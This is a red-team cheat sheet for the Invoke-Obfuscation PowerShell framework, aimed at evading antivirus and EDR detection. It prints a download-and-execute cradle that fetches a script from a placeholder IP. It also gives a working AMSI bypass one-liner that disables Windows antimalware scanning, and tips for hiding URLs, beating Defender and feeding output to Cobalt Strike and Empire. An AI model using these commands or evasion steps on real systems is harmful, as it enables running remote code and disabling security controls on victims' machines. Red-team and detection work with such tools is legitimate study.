# Invoke-Obfuscation Cheat Sheet (PowerShell Payload Evasion)

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a PowerShell obfuscation framework for evading static detection by AV/EDR systems. It transforms PowerShell scripts and one-liners into heavily obfuscated versions that retain full functionality.

---

## 💾 Installation

```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
cd Invoke-Obfuscation
powershell.exe -exec bypass
```

---

## 🚀 Launching the Framework

```powershell
Import-Module .Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

You’ll be dropped into an interactive obfuscation prompt.

---

## 🧠 Core Workflow

1. Select your input type:
   - `command`
   - `function`
   - `scriptblock`
   - `module`

2. Choose obfuscation **token layer** (e.g., string, variable, command)
3. Apply **encoding/transformation layer**
4. Use `run` to output the obfuscated result

---

## 🔧 Obfuscation Examples

### Obfuscate a PowerShell One-Liner

```powershell
Command: IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/a.ps1')
```

Navigate:
```
[Command]> TOKENAll
[Command]> ENCODINGBase64
[Command]> RUN
```

---

### String Obfuscation Only

```
[Command]> TOKENString
[Command]> RUN
```

Transforms:
```powershell
"IEX"
```
Into:
```
([char]73)+([char]69)+([char]88)
```

---

## 🧪 Output Types

- Obfuscated string or entire command
- Can be piped directly to payloads:
  - Cobalt Strike
  - PowerShell Empire
  - Manual use

---

## 🔐 AMSI Consideration

Invoke-Obfuscation **does not bypass AMSI** directly. Pair with:

```powershell
$e=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$e.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)
```

---

## 🔄 Export to File

Once obfuscated, use:
```
[Command]> OUTPUTFile
[Command]> RUN
```

---

## 🧯 Tips for Red Team Use

- Use randomly generated variables to avoid pattern matches
- Chain multiple token obfuscation types (string + command + encoding)
- Avoid obvious URLs — use `char` arrays or reversed strings
- Test output against Defender and Defender for Endpoint (MDE)

---

## 🔍 Related Tools

- **Invoke-DOSfuscation**: CMD obfuscation
- **Obfuscation-Toolset**: Payload delivery + obfuscation scripts
- **AMSI-Sandbox-Evasion**: Context-aware delivery wrappers

---


